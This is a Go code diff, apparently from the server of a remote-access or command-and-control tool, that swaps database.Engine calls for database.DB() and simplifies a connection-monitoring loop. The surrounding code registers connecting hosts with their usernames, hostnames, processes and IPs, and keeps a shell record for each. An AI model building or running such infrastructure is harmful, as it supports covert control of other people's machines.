@@ -136,7 +136,7 @@ func HandleKCPConnectionForWithKeys(conn *kcp.UDPSession, listenerType string, m
 
 			// 在数据库中标记为离线
 			// LogUpdate 统一记结果日志；不用 MarkOffline——其无条件删 ClientListenerType 会破坏上方振荡修复守卫的语义
-			affected, err := database.Engine.Where("uid = ?", currentUID).Update(&database.Clients{Online: "2"})
+			affected, err := database.DB().Where("uid = ?", currentUID).Update(&database.Clients{Online: "2"})
 			database.LogUpdate(affected, err, "KCP断连置离线 uid="+currentUID)
 
 			// 实时事件：连接断开也要发布离线事件（原仅超时判离线时发布）
@@ -294,7 +294,7 @@ func HandleKCPConnectionForWithKeys(conn *kcp.UDPSession, listenerType string, m
 			// 注意：已移除隧道管理器功能，改为单端口SOCKS5代理
 
 			var client database.Clients
-			exsists, _ := database.Engine.Where("uid = ?", uid).Get(&client)
+			exsists, _ := database.DB().Where("uid = ?", uid).Get(&client)
 			if !exsists { // FirstBlood
 				processID := binary.BigEndian.Uint32(metainfo[:4])
 				flag := int(metainfo[4:5][0])
@@ -346,9 +346,9 @@ func HandleKCPConnectionForWithKeys(conn *kcp.UDPSession, listenerType string, m
 				// 从监听器配置中获取心跳参数
 				heartbeatTimeout, heartbeatInterval := database.GetListenerHeartbeatConfigByAddr(conn.LocalAddr().String(), listenerType)
 
-				database.Engine.Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, heartbeatInterval)), Online: "1", Color: "", Listener: listenerType, Os: clientOs, HeartbeatTimeout: heartbeatTimeout, HeartbeatInterval: heartbeatInterval})
-				database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
-				database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})
+				database.DB().Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, heartbeatInterval)), Online: "1", Color: "", Listener: listenerType, Os: clientOs, HeartbeatTimeout: heartbeatTimeout, HeartbeatInterval: heartbeatInterval})
+				database.DB().Insert(&database.Shell{Uid: uid, ShellContent: ""})
+				database.DB().Insert(&database.Notes{Uid: uid, Note: ""})
 
 				// 触发客户端上线通知
 				if notificationManager := notification.GetNotificationManager(); notificationManager != nil {
@@ -534,7 +534,7 @@ func checkRealHeartbeats(uid string) {
 	for {
 		// 获取客户端的心跳配置
 		var client database.Clients
-		database.Engine.Where("uid = ?", uid).Get(&client)
+		database.DB().Where("uid = ?", uid).Get(&client)
 
 		// 解析心跳间隔（HeartbeatInterval，单位：秒）
 		heartbeatInterval := 10 // 默认值
@@ -581,7 +581,7 @@ func checkRealHeartbeats(uid string) {
 					uid, clientTime.TimeoutCount, heartbeatTimeout)
 
 				// 标记为离线并清理连接
-				database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "2"})
+				database.DB().Where("uid = ?", uid).Update(&database.Clients{Online: "2"})
 				delete(KCPClientManger, uid)
 				delete(ClientTimeManager, uid)
 
@@ -618,18 +618,15 @@ func monitorKCPConnection(uid string, conn *kcp.UDPSession) {
 	ticker := time.NewTicker(10 * time.Second)
 	defer ticker.Stop()
 
-	for {
-		select {
-		case <-ticker.C:
-			// 检查连接是否还在管理器中
-			Mutex.Lock()
-			_, exists := KCPClientManger[uid]
-			Mutex.Unlock()
-			if !exists {
-				// 连接已被清理，退出监控
-				logx.Debugf("🔍 [KCP监控] 连接已清理，退出监控: %s\n", uid)
-				return
-			}
+	for range ticker.C {
+		// 检查连接是否还在管理器中
+		Mutex.Lock()
+		_, exists := KCPClientManger[uid]
+		Mutex.Unlock()
+		if !exists {
+			// 连接已被清理，退出监控
+			logx.Debugf("🔍 [KCP监控] 连接已清理，退出监控: %s\n", uid)
+			return
 		}
 	}
 }
